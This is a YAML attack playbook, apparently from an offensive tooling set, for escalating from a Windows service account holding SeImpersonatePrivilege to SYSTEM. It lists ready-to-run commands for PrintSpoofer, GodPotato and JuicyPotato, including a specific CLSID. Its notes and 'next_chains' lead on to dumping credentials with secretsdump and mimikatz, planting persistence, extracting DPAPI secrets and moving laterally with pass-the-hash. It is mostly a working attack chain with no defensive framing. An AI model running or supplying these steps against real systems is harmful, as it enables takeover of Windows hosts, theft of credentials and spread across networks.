id: seimpersonate-potato
name: "Windows PE — SeImpersonatePrivilege → SYSTEM (Potato family)"
description: >
  Service accounts (IIS, SQL, etc.) almost always carry SeImpersonatePrivilege.
  That single right plus the right helper binary == NT AUTHORITY\\SYSTEM.
  Different Windows versions need different "potatoes" — pick the right one.
tags: [windows, priv-esc, potato, token-impersonation]
difficulty: easy

inputs: []

steps:
  - id: confirm_priv
    name: "Confirm SeImpersonatePrivilege is enabled"
    inline_command: "whoami /priv | findstr SeImpersonate"
    notes: |
      Must show `Enabled`. If only `Disabled` — most service accounts can
      still enable it via a tiny AdjustTokenPrivileges call (PowerSploit).

  - id: pick_potato
    name: "Pick the potato for the Windows version"
    inline_command: |
      systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
    notes: |
      Server 2008 R2 / Win 7 / Server 2012:  JuicyPotato (BITS COM CLSID)
      Server 2016 / Win 10 1809+:           RoguePotato / PrintSpoofer
      Server 2019 / Server 2022 / Win 11:   GodPotato (RPC over SMB)
      The patched-DCOM list breaks JuicyPotato on newer versions — start
      with PrintSpoofer/GodPotato when in doubt.

  - id: printspoofer
    name: "PrintSpoofer (most modern Windows)"
    inline_command: "PrintSpoofer.exe -i -c cmd"
    notes: |
      Needs SeImpersonatePrivilege + RPC printer spooler reachable. Drops
      you into a SYSTEM shell. Use `-c \"<command>\"` to fire-and-forget.

  - id: godpotato
    name: "GodPotato (Windows 2022 / 11)"
    inline_command: "GodPotato.exe -cmd \"cmd /c whoami > C:\\Users\\Public\\who.txt\""
    notes: |
      GodPotato survives the patches that killed JuicyPotato. Same idea —
      impersonate the SYSTEM token via the RpcCss service.

  - id: juicypotato_legacy
    name: "JuicyPotato (legacy Windows ≤ 2016)"
    inline_command: "JuicyPotato.exe -t * -p C:\\Windows\\System32\\cmd.exe -l 9999 -c \"{4991d34b-80a1-4291-83b6-3328366b9097}\""
    notes: |
      The CLSID list at https://github.com/ohpe/juicy-potato/tree/master/CLSID
      groups working CLSIDs per OS build. Use a CLSID flagged for SYSTEM.

  - id: confirm_system
    name: "Confirm SYSTEM"
    inline_command: "whoami"
    notes: |
      Expected: `nt authority\\system`. From here: secretsdump locally,
      mimikatz, drop a persistence service / scheduled task.

references:
  - title: "Potato family — itm4n"
    url:   "https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/"
  - title: "GodPotato"
    url:   "https://github.com/BeichenDream/GodPotato"

next_chains:
  - chain: dpapi-secrets-extraction
    reason: 'SYSTEM → secretsdump locally, pull every user''s DPAPI.'
  - chain: pth-lateral-spread
    when:   'NTLM hashes captured locally'
    reason: 'New identities → lateral movement.'
